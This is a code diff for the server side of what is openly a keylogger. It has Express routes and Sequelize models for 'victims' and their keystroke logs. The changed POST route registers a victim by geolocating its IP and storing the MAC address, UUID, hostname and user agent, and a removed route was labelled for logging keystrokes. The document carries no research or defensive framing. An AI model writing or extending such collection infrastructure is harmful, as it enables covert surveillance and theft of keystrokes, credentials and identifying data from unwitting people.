@@ -16,11 +16,7 @@ const sequelize = new Sequelize(config.db.database, config.db.username, config.d
 
 const Victim = sequelize.import(path.join(__dirname, '../models/victim'));
 const Log = sequelize.import(path.join(__dirname, '../models/log'));
-Victim.Logs = Victim.hasMany(Log, {
-  foreignKey: {
-    allowNull: false
-  }
-});
+Victim.Logs = Victim.hasMany(Log);
 
 sequelize.sync({
   force: true
@@ -77,7 +73,7 @@ router.use('/victims', (req, res, next) => {
  * 
  * @apiSuccess {Array} victims victims which are already tracked
  */
-router.get('/victims', (req, res) => {
+router.get('/victims', (req, res, next) => {
   Victim.all()
     .then(victims => {
         res.json(victims);
@@ -127,33 +123,47 @@ router.get('/victims/:id/logs', (req, res) => {
 });
 
 /**
- * @api {post} /api/log Log the keystrokes
+ * @api {post} /api/victim Create the victim to log
  * @apiName AddKeystrokes
  * @apiGroup Log
  * 
  * @apiPermission None
  * 
- * @apiParam {MACAddress} string Victims MAC
- * @apiParam {keystrokes} string keystrokes which have been tracked
+ * @apiParam {String} MACAddress Victims MAC
+ * @apiParam {String} UUID
+ * @apiParam {String} Hostname
+ * @apiSuccess {Object} Victim Returns victim object with all attributes
  */
-router.post('/log', (req, res) => {
+router.post('/victims', (req, res) => {
   var ip = req.connection.remoteAddress;
   // FIXME: rem default ip
   ip = "212.152.179.113";
   var useragent = req.headers['user-agent'];
-  var macAdress = req.body.macAdress;
-
+  
+  console.log("1")
   request.get('http://ip-api.com/json/' + ip, (error, response, body) => {
     if (!error && response.statusCode == 200) {
       var ipInfo = JSON.parse(body);
+      console.log("2")
 
       if(ipInfo.status == 'fail')
         res.status(400).json({ error: ipInfo.message })
       else {
         // TODO: insert in database
-        console.log(ip, useragent, ipInfo)
-
-        res.json({ip, useragent, ipInfo})
+        Victim.create({
+          ip: ip,
+          country: ipInfo.country,
+          region: ipInfo.regionName,
+          city: ipInfo.city,
+          macAdress: req.body.macAdress,
+          useragent: req.headers['user-agent'],
+          uuid: req.body.uuid,
+          hostname: req.body.hostname
+        }).then((victim) => {
+          victim.reload().then((reloadedModel) => {
+            res.json(reloadedModel);
+          })
+        })
       }
     }
   })
